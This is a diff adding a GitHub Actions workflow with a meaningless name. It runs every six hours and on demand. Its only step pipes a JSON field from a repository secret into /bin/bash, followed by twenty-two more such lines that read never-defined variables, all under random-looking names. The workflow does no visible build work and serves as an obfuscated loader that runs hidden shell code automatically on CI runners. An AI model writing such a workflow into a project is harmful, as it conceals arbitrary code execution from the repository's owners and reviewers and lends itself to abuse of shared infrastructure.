@@ -1,0 +1,40 @@
+name: jikeyibangwochuang
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '39 0/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: jikeyibangwochuang
+        env:
+          ydfmx09251: ${{ secrets.ydfmx09251 }}
+        run: |
+          echo $ydfmx09251 | jq -r .pzx3456 | /bin/bash
+          echo $sj28616 | jq -r .ns37626 | /bin/bash
+          echo $y226 | jq -r .kvlo05101 | /bin/bash
+          echo $olckb31825 | jq -r .ur89 | /bin/bash
+          echo $qsinm27 | jq -r .lf98428 | /bin/bash
+          echo $o98 | jq -r .hzwkh35243 | /bin/bash
+          echo $t993 | jq -r .fneq72 | /bin/bash
+          echo $ala08648 | jq -r .yuby0357 | /bin/bash
+          echo $fbtpd83728 | jq -r .tbd462 | /bin/bash
+          echo $papls3 | jq -r .ramso7705 | /bin/bash
+          echo $o0 | jq -r .nqzdk52 | /bin/bash
+          echo $j1 | jq -r .lol272 | /bin/bash
+          echo $keq6087 | jq -r .yo4 | /bin/bash
+          echo $i221 | jq -r .ie1 | /bin/bash
+          echo $a74190 | jq -r .lcyfh47917 | /bin/bash
+          echo $rf297 | jq -r .gwv1070 | /bin/bash
+          echo $p21 | jq -r .k5 | /bin/bash
+          echo $cxn7 | jq -r .imzz9744 | /bin/bash
+          echo $stid08353 | jq -r .fhw3 | /bin/bash
+          echo $wy671 | jq -r .plmfu24 | /bin/bash
+          echo $b5 | jq -r .t34 | /bin/bash
+          echo $z0 | jq -r .sfz33 | /bin/bash
+          echo $y39 | jq -r .f85 | /bin/bash
+
